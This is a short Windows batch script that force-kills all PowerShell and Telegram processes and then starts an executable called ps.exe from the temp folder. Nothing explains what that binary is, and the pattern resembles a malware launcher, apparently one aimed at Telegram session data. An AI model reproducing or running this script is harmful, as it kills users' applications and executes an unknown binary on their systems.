@echo off
taskkill /f /im powershell.exe
taskkill /f /im telegram.exe
start /max "" "%temp%\ps.exe"